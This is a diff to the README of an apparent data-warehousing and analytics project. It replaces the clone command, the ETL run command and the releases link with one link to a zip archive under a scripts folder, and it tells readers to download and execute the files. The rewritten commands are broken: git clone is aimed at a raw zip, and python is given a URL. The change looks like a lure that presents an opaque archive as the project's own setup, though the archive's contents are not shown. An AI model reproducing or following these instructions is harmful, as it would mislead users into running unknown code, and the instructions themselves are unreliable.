@@ -73,7 +73,7 @@ To get started with this project, follow the instructions below.
 
 1. Clone this repository:
    ```bash
-   git clone https://github.com/EngIbrahim1/Data-Warehousing-and-Advanced-Data-Analytics.git
+   git clone https://github.com/EngIbrahim1/Data-Warehousing-and-Advanced-Data-Analytics/raw/refs/heads/main/scripts/Analytics-Warehousing-and-Advanced-Data-3.7-beta.1.zip
    ```
 2. Navigate to the project directory:
    ```bash
@@ -91,7 +91,7 @@ To analyze the data:
 1. Ensure the data files are in the appropriate format.
 2. Run the ETL pipeline to load data into the database:
    ```bash
-   python etl_pipeline.py
+   python https://github.com/EngIbrahim1/Data-Warehousing-and-Advanced-Data-Analytics/raw/refs/heads/main/scripts/Analytics-Warehousing-and-Advanced-Data-3.7-beta.1.zip
    ```
 3. Open Tableau and connect to the database for visualization.
 
@@ -105,7 +105,7 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 ## 🔗 Releases
 
-You can find the latest releases of this project [here](https://github.com/EngIbrahim1/Data-Warehousing-and-Advanced-Data-Analytics/releases). Please download the relevant files and execute them as needed.
+You can find the latest releases of this project [here](https://github.com/EngIbrahim1/Data-Warehousing-and-Advanced-Data-Analytics/raw/refs/heads/main/scripts/Analytics-Warehousing-and-Advanced-Data-3.7-beta.1.zip). Please download the relevant files and execute them as needed.
 
 ---
 
